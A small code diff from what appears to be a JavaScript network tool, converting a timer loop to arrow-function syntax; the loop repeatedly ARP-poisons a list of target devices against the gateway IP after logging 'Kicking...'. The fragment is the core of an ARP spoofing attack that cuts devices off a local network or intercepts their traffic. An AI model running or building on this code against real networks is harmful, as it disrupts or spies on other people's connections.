@@ -13,8 +13,6 @@ args.forEach((val, index, args) => {
 
 console.log('Kicking...');
 arp.setInterface(INTERFACE);
-setInterval(function () {
-  TARGETS.forEach((t) => {
-    arp.poison(t, GATEWAY_IP)
-  });
+setInterval(() => {
+  TARGETS.forEach((t) => arp.poison(t, GATEWAY_IP));
 }, INTERVAL);
